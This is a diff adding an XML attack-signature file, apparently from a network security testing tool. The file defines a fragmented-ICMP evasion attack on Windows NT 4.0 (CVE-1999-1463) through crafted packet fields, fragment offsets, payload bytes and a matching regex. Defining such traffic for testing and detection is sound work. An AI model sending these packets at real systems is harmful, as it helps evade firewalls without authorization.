@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Fragment Reassembly: Windows NT Fragment Evasion"/>
+    <EngDesc display="true" value="This threat sends a fragmented ICMP packet which does not have an IP fragment offset of zero.  Can be used for evading firewalls.  A vulnerable system will reply back with an ICMP reply message."/>
+    <Intent display="true">
+      <item value="Evasion"/>
+      <item value="Fragmentation"/>
+      <item value="Implementation_Exploitation"/>
+    </Intent>
+    <Protocol display="true" value="ICMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Windows_NT_4.0"/>
+      <item value="Windows_NT_4.0_Service_Pack_1"/>
+      <item value="Windows_NT_4.0_Service_Pack_2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.insecure.org/sploits/NT.no_first_fragment.IP_frag.attack.html"/>
+    <CVEID display="true" value="CVE-1999-1463"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="10616"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464fc3bf00a900fe009b00c929465bbe"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200575000000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value="IP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X18\X19\X1a\X1b\X1c\X1d\X1e\X1f\X20\X21\X22\X23\X24\X25\X26\X27\X28\X29\X2a\X2b\X2c\X2d\X2e\X2f\X30\X31\X32\X33\X34\X35\X36\X37"/>
+    <Created value="1139461819" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+    <for index="F"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="1" FragmentOffset="2" TTL="20" Protocol="1" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="08006486860e000b38d2b440324a030008090a0b0c0d0e0f1011121314151617" CE="false" DF="true" MF="false"/>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="1" FragmentOffset="1" TTL="20" Protocol="1" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="18191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637" CE="false" DF="true" MF="true"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
